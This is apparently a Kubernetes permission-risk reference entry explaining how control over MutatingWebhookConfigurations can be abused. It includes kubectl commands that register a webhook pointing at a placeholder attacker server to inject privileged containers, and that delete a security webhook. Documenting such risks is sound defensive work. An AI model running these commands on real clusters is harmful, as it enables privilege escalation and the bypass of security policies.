## Description

Grants control over MutatingWebhookConfigurations, which can modify API objects during admission. This is extremely critical as an attacker can create or alter webhooks to inject malicious configurations, escalate privileges, bypass security policies, or cause denial of service.

## Abuse Scenarios

1. Create a new MutatingWebhookConfiguration to inject privileged containers into pods.

```bash
kubectl create -f - <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: privileged-injector
webhooks:
- name: privileged-injector.example.com
  clientConfig:
    url: "https://<malicious-webhook-server>/mutate" # Attacker-controlled server
    caBundle: <base64-encoded-ca-cert> # Self-signed CA for attacker's server
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1", "v1beta1"]
  sideEffects: None
  failurePolicy: Ignore # To avoid breaking legitimate operations
EOF
# Example: kubectl create -f - <<EOF ... EOF

```

2. Delete a critical MutatingWebhookConfiguration, potentially bypassing security policies.

```bash
kubectl delete mutatingwebhookconfiguration <webhook-name>
# Example: kubectl delete mutatingwebhookconfiguration pod-defaults-webhook

```
